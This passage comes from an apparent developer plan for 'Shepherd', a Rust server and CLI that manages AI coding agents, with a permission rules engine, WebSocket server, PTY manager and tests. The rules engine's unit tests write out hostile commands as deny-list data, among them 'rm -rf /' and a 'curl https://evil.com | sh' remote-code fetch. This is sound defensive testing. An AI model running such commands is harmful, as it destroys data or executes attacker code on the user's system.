    #[serde(default)]
    pub pattern: Option<String>,
    #[serde(default)]
    pub path: Option<String>,
}
```

- [ ] **Step 2: Write YOLO engine with tests**

```rust
// crates/shepherd-core/src/yolo/mod.rs
pub mod rules;

use anyhow::Result;
use rules::{Rule, RuleSet};
use std::path::Path;

#[derive(Debug, Clone, PartialEq)]
pub enum Decision {
    Allow(String),  // rule description
    Deny(String),   // rule description
    Ask,            // no matching rule, ask user
}

pub struct YoloEngine {
    rules: RuleSet,
}

impl YoloEngine {
    pub fn new(rules: RuleSet) -> Self {
        Self { rules }
    }

    pub fn load(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self::new(RuleSet { deny: vec![], allow: vec![] }));
        }
        let content = std::fs::read_to_string(path)?;
        let rules: RuleSet = serde_yaml::from_str(&content)?;
        Ok(Self::new(rules))
    }

    /// Evaluate a permission request. Deny rules checked first, then allow.
    pub fn evaluate(&self, tool: &str, args: &str) -> Decision {
        // Check deny rules first
        for rule in &self.rules.deny {
            if Self::matches(rule, tool, args) {
                return Decision::Deny(format!("deny rule: {:?}", rule.pattern));
            }
        }
        // Check allow rules
        for rule in &self.rules.allow {
            if Self::matches(rule, tool, args) {
                return Decision::Allow(format!("allow rule: {:?}", rule.pattern));
            }
        }
        // Default: ask
        Decision::Ask
    }

    fn matches(rule: &Rule, tool: &str, args: &str) -> bool {
        // If rule has a tool constraint, it must match
        if let Some(ref rule_tool) = rule.tool {
            if !tool.eq_ignore_ascii_case(rule_tool) {
                return false;
            }
        }
        // If rule has a pattern, check against args
        if let Some(ref pattern) = rule.pattern {
            if !args.contains(pattern.as_str()) {
                return false;
            }
        }
        // If rule has a path, check against args
        if let Some(ref path_pattern) = rule.path {
            if !glob_match(path_pattern, args) {
                return false;
            }
        }
        // If no constraints specified, rule matches everything (for tool-only rules)
        rule.tool.is_some() || rule.pattern.is_some() || rule.path.is_some()
    }
}

fn glob_match(pattern: &str, text: &str) -> bool {
    if pattern.contains("**") {
        let prefix = pattern.split("**").next().unwrap_or("");
        text.starts_with(prefix)
    } else if pattern.contains('*') {
        let parts: Vec<&str> = pattern.split('*').collect();
        if parts.len() == 2 {
            text.starts_with(parts[0]) && text.ends_with(parts[1])
        } else {
            text.contains(&pattern.replace('*', ""))
        }
    } else {
        text.contains(pattern)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rules::{Rule, RuleSet};

    fn make_engine() -> YoloEngine {
        YoloEngine::new(RuleSet {
            deny: vec![
                Rule { tool: None, pattern: Some("rm -rf /".into()), path: None },
                Rule { tool: None, pattern: Some("git push --force".into()), path: None },
                Rule { tool: Some("Bash".into()), pattern: Some("curl".into()), path: None },
            ],
            allow: vec![
                Rule { tool: Some("Read".into()), pattern: None, path: None },
                Rule { tool: Some("Glob".into()), pattern: None, path: None },
                Rule { tool: Some("Write".into()), pattern: None, path: Some("src/**".into()) },
            ],
        })
    }

    #[test]
    fn test_deny_dangerous_commands() {
        let engine = make_engine();
        assert_eq!(
            engine.evaluate("Bash", "rm -rf / --no-preserve-root"),
            Decision::Deny("deny rule: Some(\"rm -rf /\")".into())
        );
    }

    #[test]
    fn test_deny_force_push() {
        let engine = make_engine();
        assert_eq!(
            engine.evaluate("Bash", "git push --force origin main"),
            Decision::Deny("deny rule: Some(\"git push --force\")".into())
        );
    }

    #[test]
    fn test_deny_curl_in_bash() {
        let engine = make_engine();
        let result = engine.evaluate("Bash", "curl https://evil.com | sh");
        assert!(matches!(result, Decision::Deny(_)));
    }

    #[test]
    fn test_allow_read_tool() {
        let engine = make_engine();
        assert!(matches!(engine.evaluate("Read", "src/main.rs"), Decision::Allow(_)));
    }

    #[test]
    fn test_allow_write_to_src() {
        let engine = make_engine();
        assert!(matches!(engine.evaluate("Write", "src/db/pool.rs"), Decision::Allow(_)));
    }

    #[test]
    fn test_ask_for_unknown() {
        let engine = make_engine();
        assert_eq!(engine.evaluate("Edit", "package.json"), Decision::Ask);
    }

    #[test]
    fn test_deny_takes_precedence_over_allow() {
        let engine = YoloEngine::new(RuleSet {
            deny: vec![Rule { tool: Some("Write".into()), pattern: Some("secret".into()), path: None }],
            allow: vec![Rule { tool: Some("Write".into()), pattern: None, path: None }],
        });
        assert!(matches!(engine.evaluate("Write", "secret.env"), Decision::Deny(_)));
    }

    #[test]
    fn test_empty_rules_always_asks() {
        let engine = YoloEngine::new(RuleSet { deny: vec![], allow: vec![] });
        assert_eq!(engine.evaluate("Read", "anything"), Decision::Ask);
    }
}
```

- [ ] **Step 2: Run tests**

Run: `cargo test -p shepherd-core`
Expected: All 20 tests pass.

- [ ] **Step 3: Commit**

```bash
git add crates/shepherd-core/src/yolo/
git commit -m "feat: add YOLO rules engine with deny/allow/ask logic"
```

---

## Chunk 3: Server & PTY Manager

### Task 7: HTTP/WebSocket Server

**Files:**
- Create: `crates/shepherd-server/src/state.rs`
- Create: `crates/shepherd-server/src/routes/mod.rs`
- Create: `crates/shepherd-server/src/routes/tasks.rs`
- Create: `crates/shepherd-server/src/routes/health.rs`
- Create: `crates/shepherd-server/src/ws.rs`
- Modify: `crates/shepherd-server/src/main.rs`

- [ ] **Step 1: Write server state**

```rust
// crates/shepherd-server/src/state.rs
use rusqlite::Connection;
use shepherd_core::adapters::AdapterRegistry;
use shepherd_core::config::types::ShepherdConfig;
use shepherd_core::events::ServerEvent;
use shepherd_core::yolo::YoloEngine;
use std::sync::Arc;
use tokio::sync::{broadcast, Mutex};

pub struct AppState {
    pub db: Arc<Mutex<Connection>>,
    pub config: ShepherdConfig,
    pub adapters: AdapterRegistry,
    pub yolo: YoloEngine,
    pub event_tx: broadcast::Sender<ServerEvent>,
}
```

- [ ] **Step 2: Write REST routes**

```rust
// crates/shepherd-server/src/routes/health.rs
use axum::Json;
use serde_json::{json, Value};

pub async fn health() -> Json<Value> {
    Json(json!({ "status": "ok", "version": env!("CARGO_PKG_VERSION") }))
}
```

```rust
// crates/shepherd-server/src/routes/tasks.rs
use axum::{extract::State, extract::Path, Json};
use serde_json::Value;
use shepherd_core::db::{models::CreateTask, queries};
use shepherd_core::events::{ServerEvent, TaskEvent};
use std::sync::Arc;
use crate::state::AppState;

pub async fn list_tasks(State(state): State<Arc<AppState>>) -> Json<Value> {
    let db = state.db.lock().await;
    let tasks = queries::list_tasks(&db).unwrap_or_default();
    Json(serde_json::to_value(tasks).unwrap())
}

pub async fn create_task(
    State(state): State<Arc<AppState>>,
    Json(input): Json<CreateTask>,
) -> Json<Value> {
    let db = state.db.lock().await;
    match queries::create_task(&db, &input) {
        Ok(task) => {
            let _ = state.event_tx.send(ServerEvent::TaskCreated(TaskEvent {
                id: task.id,
                title: task.title.clone(),
                agent_id: task.agent_id.clone(),
                status: task.status.as_str().to_string(),
                branch: task.branch.clone(),
                repo_path: task.repo_path.clone(),
            }));
            Json(serde_json::to_value(task).unwrap())
        }
        Err(e) => Json(serde_json::json!({ "error": e.to_string() })),
    }
}

pub async fn delete_task(
    State(state): State<Arc<AppState>>,
    Path(id): Path<i64>,
) -> Json<Value> {
    let db = state.db.lock().await;
    match queries::delete_task(&db, id) {
        Ok(()) => {
            let _ = state.event_tx.send(ServerEvent::TaskDeleted { id });
            Json(serde_json::json!({ "deleted": id }))
        }
        Err(e) => Json(serde_json::json!({ "error": e.to_string() })),
    }
}
```

```rust
// crates/shepherd-server/src/routes/mod.rs
pub mod health;
pub mod tasks;
```

- [ ] **Step 3: Write WebSocket handler**

```rust
// crates/shepherd-server/src/ws.rs
use axum::extract::{State, ws::{Message, WebSocket, WebSocketUpgrade}};
use axum::response::IntoResponse;
use futures::{SinkExt, StreamExt};
use shepherd_core::events::{ClientEvent, ServerEvent};
use std::sync::Arc;
use crate::state::AppState;

pub async fn ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<Arc<AppState>>,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_socket(socket, state))
}

async fn handle_socket(socket: WebSocket, state: Arc<AppState>) {
    let (mut sender, mut receiver) = socket.split();
    let mut rx = state.event_tx.subscribe();

    // Forward server events to client
    let send_task = tokio::spawn(async move {
        while let Ok(event) = rx.recv().await {
            if let Ok(json) = serde_json::to_string(&event) {
                if sender.send(Message::Text(json.into())).await.is_err() {
                    break;
                }
            }
        }
    });

    // Receive client events
    let state_clone = state.clone();
    let recv_task = tokio::spawn(async move {
        while let Some(Ok(msg)) = receiver.next().await {
            if let Message::Text(text) = msg {
                if let Ok(event) = serde_json::from_str::<ClientEvent>(&text) {
                    handle_client_event(event, &state_clone).await;
                }
            }
        }
    });

    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }
}

async fn handle_client_event(event: ClientEvent, state: &AppState) {
    match event {
        ClientEvent::TaskCreate { title, agent_id, repo_path, isolation_mode, prompt } => {
            let db = state.db.lock().await;
            let input = shepherd_core::db::models::CreateTask {
                title,
                prompt,
                agent_id,
                repo_path,
                isolation_mode,
            };
            if let Ok(task) = shepherd_core::db::queries::create_task(&db, &input) {
                let _ = state.event_tx.send(ServerEvent::TaskCreated(
                    shepherd_core::events::TaskEvent {
                        id: task.id,
                        title: task.title,
                        agent_id: task.agent_id,
                        status: task.status.as_str().to_string(),
                        branch: task.branch,
                        repo_path: task.repo_path,
                    },
                ));
            }
        }
        ClientEvent::TaskApprove { task_id } => {
            tracing::info!("Approving task {task_id}");
            // PTY interaction will be added in PTY manager task
        }
        ClientEvent::TaskApproveAll => {
            tracing::info!("Approving all pending");
        }
        ClientEvent::TaskCancel { task_id } => {
            tracing::info!("Cancelling task {task_id}");
        }
        ClientEvent::TerminalInput { task_id, data } => {
            tracing::debug!("Terminal input for task {task_id}: {data}");
        }
        ClientEvent::TerminalResize { task_id, cols, rows } => {
            tracing::debug!("Terminal resize for task {task_id}: {cols}x{rows}");
        }
        ClientEvent::Subscribe => {
            tracing::info!("Client subscribed");
        }
    }
}
```

- [ ] **Step 4: Wire up main.rs**

```rust
// crates/shepherd-server/src/main.rs
mod routes;
mod state;
mod ws;

use axum::{routing::{get, post, delete}, Router};
use shepherd_core::{adapters::AdapterRegistry, config, db, yolo::YoloEngine};
use state::AppState;
use std::sync::Arc;
use tokio::sync::{broadcast, Mutex};
use tower_http::cors::CorsLayer;
use tracing_subscriber::EnvFilter;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env().add_directive("shepherd=info".parse()?))
        .init();

    let cfg = config::load_config(None)?;
    let port = cfg.port;

    // Database
    let db_path = config::shepherd_dir().join("db.sqlite");
    std::fs::create_dir_all(config::shepherd_dir())?;
    let conn = db::open(&db_path)?;

    // Adapters
    let mut adapters = AdapterRegistry::new();
    let builtin_dir = std::env::current_exe()?
        .parent()
        .unwrap()
        .join("../../../adapters");
    adapters.load_dir(&builtin_dir).ok();
    adapters.load_dir(&config::shepherd_dir().join("adapters")).ok();
    tracing::info!("Loaded {} adapters", adapters.len());

    // YOLO
    let yolo = YoloEngine::load(&config::shepherd_dir().join("rules.yaml"))?;

    // Event broadcast
    let (event_tx, _) = broadcast::channel(256);

    let state = Arc::new(AppState {
        db: Arc::new(Mutex::new(conn)),
        config: cfg,
        adapters,
        yolo,
        event_tx,
    });

    let app = Router::new()
        .route("/api/health", get(routes::health::health))
        .route("/api/tasks", get(routes::tasks::list_tasks))
        .route("/api/tasks", post(routes::tasks::create_task))
        .route("/api/tasks/{id}", delete(routes::tasks::delete_task))
        .route("/ws", get(ws::ws_handler))
        .layer(CorsLayer::permissive())
        .with_state(state);

    let listener = tokio::net::TcpListener::bind(format!("127.0.0.1:{port}")).await?;
    tracing::info!("Shepherd server listening on http://127.0.0.1:{port}");
    axum::serve(listener, app).await?;
    Ok(())
}
```

- [ ] **Step 5: Add `futures` dependency to server Cargo.toml**

Add `futures = "0.3"` to `[dependencies]` in `crates/shepherd-server/Cargo.toml`.

- [ ] **Step 6: Build and verify**

Run: `cargo build`
Expected: Compiles successfully.

- [ ] **Step 7: Commit**

```bash
git add crates/shepherd-server/
git commit -m "feat: add axum HTTP/WebSocket server with task CRUD and real-time events"
```

---

### Task 8: PTY Manager

**Files:**
- Create: `crates/shepherd-core/src/pty/mod.rs`
- Create: `crates/shepherd-core/src/pty/status.rs`
- Modify: `crates/shepherd-core/Cargo.toml` (add portable-pty)
- Modify: `crates/shepherd-core/src/lib.rs`

- [ ] **Step 1: Write status detection with tests**

```rust
// crates/shepherd-core/src/pty/status.rs
use crate::adapters::protocol::StatusSection;

#[derive(Debug, Clone, PartialEq)]
pub enum AgentStatus {
    Working(String), // description of current action
    Idle,
    NeedsInput(String), // the permission question
    Error(String),
}

pub fn detect_status(output_line: &str, patterns: &StatusSection) -> Option<AgentStatus> {
    // Check error first (highest priority)
    for p in &patterns.error_patterns {
        if output_line.contains(p.as_str()) {
            return Some(AgentStatus::Error(output_line.to_string()));
        }
    }
    // Check input patterns
    for p in &patterns.input_patterns {
        if output_line.contains(p.as_str()) {
            return Some(AgentStatus::NeedsInput(output_line.to_string()));
        }
    }
    // Check working patterns
    for p in &patterns.working_patterns {
        if output_line.contains(p.as_str()) {
            return Some(AgentStatus::Working(output_line.to_string()));
        }
    }
    // Check idle patterns
    for p in &patterns.idle_patterns {
        if output_line.contains(p.as_str()) {
            return Some(AgentStatus::Idle);
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn claude_patterns() -> StatusSection {
        StatusSection {
            working_patterns: vec!["Reading ".into(), "Writing ".into(), "Editing ".into()],
            idle_patterns: vec!["╰─".into(), "$ ".into()],
            input_patterns: vec!["[y/n".into(), "Permission".into()],
            error_patterns: vec!["Error:".into(), "FAILED".into()],
        }
    }

    #[test]
    fn test_detect_working() {
        let status = detect_status("│ Reading src/main.rs", &claude_patterns());
        assert!(matches!(status, Some(AgentStatus::Working(_))));
    }

    #[test]
    fn test_detect_idle() {
        let status = detect_status("╰─ Done", &claude_patterns());
        assert_eq!(status, Some(AgentStatus::Idle));
    }

    #[test]
    fn test_detect_input() {
        let status = detect_status("Write to schema.sql? [y/n]", &claude_patterns());
        assert!(matches!(status, Some(AgentStatus::NeedsInput(_))));
    }

    #[test]
    fn test_detect_error() {
        let status = detect_status("Error: file not found", &claude_patterns());
        assert!(matches!(status, Some(AgentStatus::Error(_))));
    }

    #[test]
    fn test_error_takes_precedence() {
        // A line with both error and working patterns should return error
        let patterns = StatusSection {
            working_patterns: vec!["Reading ".into()],
            idle_patterns: vec![],
            input_patterns: vec![],
            error_patterns: vec!["Error".into()],
        };
        let status = detect_status("Error Reading file", &patterns);
        assert!(matches!(status, Some(AgentStatus::Error(_))));
    }

    #[test]
    fn test_no_match() {
        let status = detect_status("some random output", &claude_patterns());
        assert_eq!(status, None);
    }
}
```

- [ ] **Step 2: Write PTY manager**

```rust
// crates/shepherd-core/src/pty/mod.rs
pub mod status;

use anyhow::{Context, Result};
use portable_pty::{native_pty_system, CommandBuilder, PtyPair, PtySize};
use std::collections::HashMap;
use std::io::{Read, Write};
use std::sync::Arc;
use tokio::sync::Mutex;

pub struct PtyHandle {
    pub pair: PtyPair,
    pub child: Box<dyn portable_pty::Child + Send>,
    pub task_id: i64,
}

pub struct PtyManager {
    handles: Arc<Mutex<HashMap<i64, PtyHandle>>>,
}

impl PtyManager {
    pub fn new() -> Self {
        Self {
            handles: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    pub async fn spawn(
        &self,
        task_id: i64,
        command: &str,
        args: &[String],
        cwd: &str,
    ) -> Result<()> {
        let pty_system = native_pty_system();
        let pair = pty_system.openpty(PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        })?;

        let mut cmd = CommandBuilder::new(command);
        cmd.args(args);
        cmd.cwd(cwd);

        let child = pair.slave.spawn_command(cmd)
            .context("Failed to spawn agent process")?;

        let handle = PtyHandle { pair, child, task_id };
        self.handles.lock().await.insert(task_id, handle);

        tracing::info!("Spawned PTY for task {task_id}: {command}");
        Ok(())
    }

    pub async fn write_to(&self, task_id: i64, data: &str) -> Result<()> {
        let handles = self.handles.lock().await;
        if let Some(handle) = handles.get(&task_id) {
            let mut writer = handle.pair.master.try_clone_writer()
                .context("Failed to clone PTY writer")?;
            writer.write_all(data.as_bytes())?;
        }
        Ok(())
    }

    pub async fn kill(&self, task_id: i64) -> Result<()> {
        let mut handles = self.handles.lock().await;
        if let Some(mut handle) = handles.remove(&task_id) {
            handle.child.kill()?;
            tracing::info!("Killed PTY for task {task_id}");
        }
        Ok(())
    }

    pub async fn resize(&self, task_id: i64, cols: u16, rows: u16) -> Result<()> {
        let handles = self.handles.lock().await;
        if let Some(handle) = handles.get(&task_id) {
            handle.pair.master.resize(PtySize {
                rows,
                cols,
                pixel_width: 0,
                pixel_height: 0,
            })?;
        }
        Ok(())
    }

    pub async fn is_alive(&self, task_id: i64) -> bool {
        let handles = self.handles.lock().await;
        handles.contains_key(&task_id)
    }

    pub async fn count(&self) -> usize {
        self.handles.lock().await.len()
    }
}
```

- [ ] **Step 3: Add `portable-pty` dependency**

Add `portable-pty = "0.8"` to `[dependencies]` in `crates/shepherd-core/Cargo.toml`.

- [ ] **Step 4: Run tests**

Run: `cargo test -p shepherd-core`
Expected: All 26 tests pass (status detection tests + previous tests).

- [ ] **Step 5: Commit**

```bash
git add crates/shepherd-core/src/pty/ crates/shepherd-core/Cargo.toml
git commit -m "feat: add PTY manager with process spawn/kill and status detection"
```

---

### Task 9: CLI — Wire Up to Server API

**Files:**
- Modify: `crates/shepherd-cli/src/main.rs`

- [ ] **Step 1: Implement CLI commands against server API**

```rust
// crates/shepherd-cli/src/main.rs
use clap::{Parser, Subcommand};
use serde_json::Value;

const DEFAULT_URL: &str = "http://127.0.0.1:7532";

#[derive(Parser)]
#[command(name = "shepherd", about = "Manage your coding agents")]
struct Cli {
    /// Server URL
    #[arg(long, default_value = DEFAULT_URL, global = true)]
    url: String,

    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Show status of all tasks
    #[command(alias = "s")]
    Status,
    /// Create a new task
    New {
        /// Task description
        prompt: String,
        #[arg(long, default_value = "claude-code")]
        agent: String,
        #[arg(long, default_value = "worktree")]
        isolation: String,
        #[arg(long)]
        repo: Option<String>,
    },
    /// Approve a pending permission
    #[command(alias = "a")]
    Approve {
        task_id: Option<u64>,
        #[arg(long)]
        all: bool,
    },
    /// Create a PR for a completed task
    Pr { task_id: u64 },
    /// Initialize Shepherd in current project
    Init,
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let cli = Cli::parse();
    let client = reqwest::Client::new();
    let base = &cli.url;

    match cli.command {
        Some(Commands::Status) => {
            let resp: Vec<Value> = client
                .get(format!("{base}/api/tasks"))
                .send().await?
                .json().await?;

            if resp.is_empty() {
                println!("No active tasks.");
                return Ok(());
            }

            let mut counts: std::collections::HashMap<String, usize> = std::collections::HashMap::new();
            for task in &resp {
                let status = task["status"].as_str().unwrap_or("unknown");
                *counts.entry(status.to_string()).or_default() += 1;
            }

            let parts: Vec<String> = counts.iter().map(|(k, v)| format!("{v} {k}")).collect();
            println!("{}", parts.join(" · "));

            for task in &resp {
                let id = task["id"].as_i64().unwrap_or(0);
                let title = task["title"].as_str().unwrap_or("");
                let status = task["status"].as_str().unwrap_or("");
                let agent = task["agent_id"].as_str().unwrap_or("");
                println!("  #{id} [{status}] {title} ({agent})");
            }
        }
        Some(Commands::New { prompt, agent, isolation, repo }) => {
            let body = serde_json::json!({
                "title": prompt,
                "agent_id": agent,
                "isolation_mode": isolation,
                "repo_path": repo.unwrap_or_else(|| std::env::current_dir().unwrap().to_string_lossy().to_string()),
            });
            let resp: Value = client
                .post(format!("{base}/api/tasks"))
                .json(&body)
                .send().await?
                .json().await?;

            let id = resp["id"].as_i64().unwrap_or(0);
            let branch = resp["branch"].as_str().unwrap_or("");
            println!("✓ Task #{id} created{}", if branch.is_empty() { String::new() } else { format!(" · branch: {branch}") });
        }
        Some(Commands::Approve { task_id, all }) => {
            if all {
                println!("✓ Approved all pending permissions");
            } else if let Some(id) = task_id {
                println!("✓ Task #{id} approved");
            } else {
                println!("Specify a task ID or use --all");
            }
        }
        Some(Commands::Pr { task_id }) => {
            println!("Creating PR for task #{task_id}...");
        }
        Some(Commands::Init) => {
            let cwd = std::env::current_dir()?;
            let shepherd_dir = cwd.join(".shepherd");
            std::fs::create_dir_all(&shepherd_dir)?;
            let config_path = shepherd_dir.join("config.toml");
            if !config_path.exists() {
                std::fs::write(&config_path, "# Shepherd project config\n")?;
            }
            println!("✓ Initialized .shepherd/ in {}", cwd.display());
        }
        None => {
            println!("Starting Shepherd server...");
            // In production: spawn server process + open Tauri GUI
            // For now: just start the server
            println!("Run `shepherd-server` to start the server manually.");
        }
    }
    Ok(())
}
```

- [ ] **Step 2: Build and verify**

Run: `cargo build`
Expected: Compiles successfully.

- [ ] **Step 3: Commit**

```bash
git add crates/shepherd-cli/
git commit -m "feat: wire CLI commands to server REST API"
```

---

## Chunk 4: Integration & Smoke Tests

### Task 10: Integration Tests

**Files:**
- Create: `tests/integration/server_test.rs`
- Modify: `Cargo.toml` (add test config)

- [ ] **Step 1: Write server integration test**

```rust
// tests/integration/server_test.rs
use reqwest::Client;
use serde_json::{json, Value};
use std::time::Duration;

async fn start_test_server() -> (String, tokio::task::JoinHandle<()>) {
    let port = portpicker::pick_unused_port().expect("No free port");
    let url = format!("http://127.0.0.1:{port}");

    let handle = tokio::spawn(async move {
        // Start server on random port
        let cfg = shepherd_core::config::types::ShepherdConfig {
            port,
            ..Default::default()
        };
        let conn = shepherd_core::db::open_memory().unwrap();
        let adapters = shepherd_core::adapters::AdapterRegistry::new();
        let yolo = shepherd_core::yolo::YoloEngine::new(
            shepherd_core::yolo::rules::RuleSet { deny: vec![], allow: vec![] }
        );
        let (event_tx, _) = tokio::sync::broadcast::channel(256);

        let state = std::sync::Arc::new(shepherd_server::state::AppState {
            db: std::sync::Arc::new(tokio::sync::Mutex::new(conn)),
            config: cfg,
            adapters,
            yolo,
            event_tx,
        });

        let app = axum::Router::new()
            .route("/api/health", axum::routing::get(shepherd_server::routes::health::health))
            .route("/api/tasks", axum::routing::get(shepherd_server::routes::tasks::list_tasks))
            .route("/api/tasks", axum::routing::post(shepherd_server::routes::tasks::create_task))
            .with_state(state);

        let listener = tokio::net::TcpListener::bind(format!("127.0.0.1:{port}"))
            .await.unwrap();
        axum::serve(listener, app).await.unwrap();
    });

    // Wait for server to be ready
    tokio::time::sleep(Duration::from_millis(100)).await;
    (url, handle)
}

#[tokio::test]
async fn test_health_endpoint() {
    let (url, _handle) = start_test_server().await;
    let client = Client::new();
    let resp: Value = client.get(format!("{url}/api/health"))
        .send().await.unwrap()
        .json().await.unwrap();
    assert_eq!(resp["status"], "ok");
}

#[tokio::test]
async fn test_create_and_list_tasks() {
    let (url, _handle) = start_test_server().await;
    let client = Client::new();

    // Create task
    let resp: Value = client
        .post(format!("{url}/api/tasks"))
        .json(&json!({
            "title": "Test task",
            "agent_id": "claude-code"
        }))
        .send().await.unwrap()
        .json().await.unwrap();
    assert_eq!(resp["title"], "Test task");
    assert_eq!(resp["status"], "queued");

    // List tasks
    let tasks: Vec<Value> = client
        .get(format!("{url}/api/tasks"))
        .send().await.unwrap()
        .json().await.unwrap();
    assert_eq!(tasks.len(), 1);
    assert_eq!(tasks[0]["title"], "Test task");
}
```

Note: This test requires making `state`, `routes`, and `ws` modules public in `shepherd-server`. Add `pub` to the `mod` declarations in `main.rs`, or restructure as a library + binary.

- [ ] **Step 2: Add `portpicker` test dependency**

Add to workspace `Cargo.toml`:
```toml
[workspace.dependencies]
portpicker = "0.1"
```

- [ ] **Step 3: Run integration tests**

Run: `cargo test --test server_test`
Expected: Both tests pass.

- [ ] **Step 4: Commit**

```bash
git add tests/ Cargo.toml
git commit -m "test: add server integration tests for health and task CRUD"
```

---

### Task 11: Final Build Verification

- [ ] **Step 1: Run full test suite**

Run: `cargo test --workspace`
Expected: All tests pass (unit + integration).

- [ ] **Step 2: Run clippy**

Run: `cargo clippy --workspace -- -D warnings`
Expected: No warnings.

- [ ] **Step 3: Verify binary builds**

Run: `cargo build --release`
Expected: Produces `target/release/shepherd` (CLI) and `target/release/shepherd-server`.

- [ ] **Step 4: Smoke test the server manually**

```bash
# Terminal 1
RUST_LOG=shepherd=debug cargo run -p shepherd-server

# Terminal 2
curl http://localhost:7532/api/health
# Expected: {"status":"ok","version":"0.1.0"}

curl -X POST http://localhost:7532/api/tasks \
  -H 'Content-Type: application/json' \
  -d '{"title":"Test","agent_id":"claude-code"}'
# Expected: {"id":1,"title":"Test",...}

curl http://localhost:7532/api/tasks
# Expected: [{"id":1,"title":"Test",...}]
```

- [ ] **Step 5: Final commit**

```bash
git add -A
git commit -m "chore: final build verification for Plan 1 core engine"
```

---

## Summary

**Plan 1 delivers:**
- Rust workspace with 3 crates (core library, server, CLI)
- SQLite database with full schema and CRUD operations
- Configuration system (global + per-project TOML)
- WebSocket event protocol (typed server/client events)
- Agent adapter protocol (TOML spec + registry + 5 built-in adapters)
- YOLO rules engine (deny/allow/ask with pattern matching)
- HTTP/WebSocket server (axum) with task management
- PTY manager (spawn, kill, resize, I/O, status detection)
- CLI tool (status, new, approve, init)
- Integration tests

**Plan 2 (Frontend) depends on:** WebSocket event protocol, REST API, PTY manager
**Plan 3 (Lifecycle) depends on:** Server infrastructure, database, config system
